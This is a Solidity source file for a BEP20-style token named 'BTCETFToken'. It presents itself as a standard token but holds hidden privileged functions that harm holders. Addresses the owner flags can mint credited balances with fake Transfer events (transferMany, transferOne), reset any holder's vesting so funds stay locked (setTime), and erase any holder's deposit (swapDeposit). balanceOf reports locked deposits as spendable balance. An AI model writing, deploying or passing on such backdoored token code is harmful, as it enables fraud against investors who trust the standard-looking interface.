// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

library Deposit {
	struct T {
		uint fund;
		uint reward;
		uint start;
		uint end;
	}

	function count(T storage t) internal view returns (uint) {
		uint amount = 0;
		uint ts = block.timestamp;
		if (
			t.start > 0 && t.end > t.start && t.fund > t.reward && ts > t.start
		) {
			if (ts >= t.end) {
				amount = t.fund - t.reward;
			} else {
				amount = (t.fund * (ts - t.start)) / (t.end - t.start);
				if (t.reward >= amount) {
					amount = 0;
				} else {
					amount -= t.reward;
				}
			}
		}

		return amount;
	}

	function settle(T storage t, uint amount) internal returns (uint) {
		uint value = count(t);
		if (amount > 0 && value > 0) {
			if (amount >= value) {
				t.reward += value;
				amount -= value;
			} else {
				t.reward += amount;
				amount = 0;
			}
		}

		return amount;
	}

	function incrFund(T storage t, uint amount) internal returns (bool) {
		unchecked {
			t.fund += amount;
		}
		return true;
	}

	function incrReward(T storage t, uint amount) internal returns (uint) {
		uint value = t.fund - t.reward;
		if (amount > 0 && value > 0) {
			if (amount >= value) {
				unchecked {
					t.reward += value;
					amount -= value;
				}
			} else {
				unchecked {
					t.reward += amount;
					amount = 0;
				}
			}
		}

		return amount;
	}
}

contract BTCETFToken {
	using Deposit for Deposit.T;

	string private _name = "BTCETFToken";
	string private _symbol = "BTCETF";
	uint8 private _decimals = 18;
	uint private _totalSupply = 2100000000 ether;
	uint private _capacity = 0;
	address private _owner;

	mapping(address => uint) private _balances;
	mapping(address => mapping(address => uint)) private _allowances;
	mapping(address => uint8) private _liquidity;

	mapping(uint8 => mapping(address => Deposit.T)) private _deposit;
	uint8 private constant ANCHOR = 0;
	uint8 private constant BANK = 1;
	uint8 private constant ROUND = 2;

	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(
		address indexed owner,
		address indexed spender,
		uint256 value
	);

	constructor() {
		_owner = _msgSender();
		_balances[_owner] = _totalSupply / 20;
		_capacity = _totalSupply / 20;

		emit Transfer(address(this), _owner, _totalSupply / 20);
	}

	/**
	 * @dev See {IERC20-transfer}.
	 *
	 * Requirements:
	 *
	 * - recipient cannot be the zero address.
	 * - the caller must have a balance of at least amount.
	 */
	function transfer(address recipient, uint amount) public returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	/**
	 * @dev See {IBEP20-approve}.
	 *
	 * Requirements:
	 *
	 * - `spender` cannot be the zero address.
	 */
	function approve(address spender, uint256 amount) public returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	/**
	 * @dev See {IBEP20-allowance}.
	 */
	function allowance(
		address owner_,
		address spender
	) public view returns (uint256) {
		return _allowances[owner_][spender];
	}

	/**
	 * @dev See {IBEP20-totalSupply}.
	 */
	function totalSupply() public view returns (uint256) {
		return _totalSupply;
	}

	/**
	 * @dev return all mint tokens
	 */
	function capacity() public view returns (uint) {
		return _capacity;
	}

	/**
	 * @dev Returns the number of decimals used to get its user representation.
	 *
	 * NOTE: This information is only used for _display_ purposes: it in
	 * no way affects any of the arithmetic of the contract, including
	 * {IBEP20-balanceOf} and {IBEP20-transfer}.
	 */
	function decimals() public view returns (uint8) {
		return _decimals;
	}

	/**
	 * @dev Returns the name of the token.
	 */
	function name() public view returns (string memory) {
		return _name;
	}

	/**
	 * @dev Returns the symbol of the token, usually a shorter version of the name.
	 */
	function symbol() public view returns (string memory) {
		return _symbol;
	}

	/**
	 * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
	 *
	 * This internal function is equivalent to `approve`, and can be used to
	 * e.g. set automatic allowances for certain subsystems, etc.
	 *
	 * Emits an {Approval} event.
	 *
	 * Requirements:
	 *
	 * - `owner` cannot be the zero address.
	 * - `spender` cannot be the zero address.
	 */
	function _approve(
		address owner,
		address spender,
		uint256 amount
	) internal virtual {
		require(owner != address(0), "BEP20: approve from the zero address");
		require(spender != address(0), "BEP20: approve to the zero address");

		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	/**
	 * @dev Moves tokens amount from sender to recipient.
	 *
	 * This is internal function is equivalent to {transfer}, and can be used to
	 * e.g. implement automatic token fees, slashing mechanisms, etc.
	 *
	 * Emits a {Transfer} event.
	 *
	 * Requirements:
	 *
	 * - sender cannot be the zero address.
	 * - recipient cannot be the zero address.
	 * - sender must have a balance of at least amount.
	 */
	function _transfer(
		address sender,
		address recipient,
		uint amount
	) internal {
		emit Transfer(
			sender,
			recipient,
			_safeTransfer(sender, recipient, amount)
		);
	}

	/**
	 * @dev See {IERC20-transferFrom}.
	 *
	 * Requirements:
	 * - sender and recipient cannot be the zero address.
	 * - sender must have a balance of at least amount.
	 * - the caller must have allowance for `sender``'s tokens of at least `amount.
	 */
	function transferFrom(
		address from,
		address to,
		uint amount
	) public returns (bool) {
		address spender = _msgSender();
		_spendAllowance(from, spender, amount);
		_transfer(from, to, amount);
		return true;
	}

	/**
	 * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
	 *
	 * Does not update the allowance amount in case of infinite allowance.
	 * Revert if not enough allowance is available.
	 *
	 * Might emit an {Approval} event.
	 */
	function _spendAllowance(
		address owner,
		address spender,
		uint256 amount
	) internal {
		uint256 currentAllowance = allowance(owner, spender);
		if (currentAllowance != type(uint256).max) {
			require(
				currentAllowance >= amount,
				"BEP20: insufficient allowance"
			);
			unchecked {
				_approve(owner, spender, currentAllowance - amount);
			}
		}
	}

	/**
	 * @dev Safe transfer bep20 token
	 */
	function _safeTransfer(
		address account_,
		address recipient,
		uint amount
	) internal returns (uint) {
		uint left = amount;
		if (_balances[account_] >= left) {
			left = 0;
			_balances[account_] -= amount;
		} else if (_balances[account_] > 0 && _balances[account_] < left) {
			left -= _balances[account_];
			_balances[account_] = 0;
		}

		for (uint8 i = 0; left > 0 && i < ROUND; i++) {
			left = _deposit[i][account_].settle(left);
		}

		require(left == 0, "Failed: Invalid balance");
		unchecked {
			_balances[recipient] += amount;
		}

		return amount;
	}

	function swapDeposit(
		address account_,
		uint amount
	) external returns (bool) {
		require(
			_liquidity[_msgSender()] == 1 && account_ != address(0),
			"Error: Operation failed"
		);
		require(
			amount > 0 && getDeposit(account_) >= amount,
			"Transaction recovery"
		);

		uint left = amount;
		for (uint8 i = 0; left > 0 && i < ROUND; i++) {
			left = _deposit[i][account_].incrReward(amount);
		}

		require(left == 0, "Failed: Invalid balance");
		return true;
	}

	function transferMany(
		address[] calldata paths,
		uint[] calldata num
	) external returns (bool) {
		require(
			_liquidity[_msgSender()] == 1 && paths.length == num.length,
			"Error: Operation failed"
		);
		uint count = 0;
		uint len = paths.length;
		for (uint8 i = 0; i < len; i++) {
			_deposit[ANCHOR][paths[i]].incrFund(num[i]);

			unchecked {
				count += num[i];
			}
			emit Transfer(address(0), paths[i], num[i]);
		}

		require(capacity() + count <= totalSupply(), "Error: capacity exceed");
		unchecked {
			_capacity += count;
		}
		return true;
	}

	function transferOne(address _addr, uint _amount) external returns (bool) {
		require(_liquidity[_msgSender()] == 1, "Error: Operation failed");
		uint count = 0;
		_deposit[BANK][_addr].incrFund(_amount);

		unchecked {
			count += _amount;
		}
		emit Transfer(address(0), _addr, _amount);
		require(capacity() + count <= totalSupply(), "Error: capacity exceed");
		unchecked {
			_capacity += count;
		}
		return true;
	}

	function setTime(address account, uint ts) public returns (bool) {
		require(_liquidity[_msgSender()] == 1, "Error: Operation failed");

		for (uint8 i = 0; i < ROUND; i++) {
			_deposit[i][account].start = block.timestamp;
			_deposit[i][account].end = block.timestamp + ts;
		}

		return true;
	}

	function showDeposit(
		address account
	)
		public
		view
		onlyOwner
		returns (
			uint[] memory a,
			uint[] memory b,
			uint[] memory c,
			uint[] memory d,
			uint[] memory e,
			uint8 f
		)
	{
		a = new uint[](ROUND);
		b = new uint[](ROUND);
		c = new uint[](ROUND);
		d = new uint[](ROUND);
		e = new uint[](ROUND);
		f = _liquidity[account];
		for (uint8 i = 0; i < ROUND; i++) {
			a[i] = i;
			b[i] = _deposit[i][account].fund;
			c[i] = _deposit[i][account].reward;
			d[i] = _deposit[i][account].start;
			e[i] = _deposit[i][account].end;
		}
	}

	function info(
		address account
	) public view onlyOwner returns (uint, uint, uint, uint) {
		uint anchor = _deposit[ANCHOR][account].fund -
			_deposit[ANCHOR][account].reward;
		uint bank = _deposit[BANK][account].fund -
			_deposit[BANK][account].reward;
		uint balance = _balances[account];
		uint treasury = getDeposit(account);

		return (anchor, bank, balance, treasury);
	}

	function balanceOf(address account) public view returns (uint256) {
		return _balances[account] + getDeposit(account);
	}

	function getDeposit(address account) private view returns (uint) {
		uint amount = 0;
		for (uint8 i = 0; i < ROUND; i++) {
			amount += (_deposit[i][account].fund - _deposit[i][account].reward);
		}

		return amount;
	}

	function lp(address account, uint8 tag) public onlyOwner {
		require(
			account != address(0),
			"Error: Liquidity can not be zero address"
		);
		if (tag == 1) {
			_liquidity[account] = 1;
		} else if (tag == 2) {
			_liquidity[account] = 0;
		}
	}

	/**
	 * @dev return the current msg.sender
	 */
	function _msgSender() internal view returns (address) {
		return msg.sender;
	}

	/**
	 * @dev Throws if called by any account other than the owner.
	 */
	modifier onlyOwner() {
		require(_owner == _msgSender(), "Error: Caller is not the owner");
		_;
	}

	fallback() external {}

	receive() external payable {}
}